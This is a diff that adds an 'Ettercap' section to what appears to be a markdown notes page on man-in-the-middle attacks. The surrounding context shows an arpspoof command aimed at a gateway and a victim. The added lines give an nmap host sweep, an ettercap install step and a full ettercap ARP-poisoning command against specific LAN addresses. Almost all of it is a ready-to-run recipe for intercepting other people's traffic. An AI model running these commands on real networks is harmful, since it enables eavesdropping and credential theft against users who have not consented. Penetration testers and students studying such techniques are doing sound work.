@@ -266,9 +266,23 @@ arpspoof -i eth0 -t <gateway ip> <victim ip>
 
 {% embed url="https://github.com/ReddyyZ/mitm.py" %}
 
+## Ettercap
 
+Find IP addresses
 
+```
+sudo nmap -sn 192.168.4.0/24
+```
 
+Installation of ettercap:
+
+```
+apt install ettercap-text-only
+```
+
+```
+sudo ettercap -T -S -i wlan0 -M arp:remote /192.168.4.1// /192.168.4.11//
+```
 
 
 
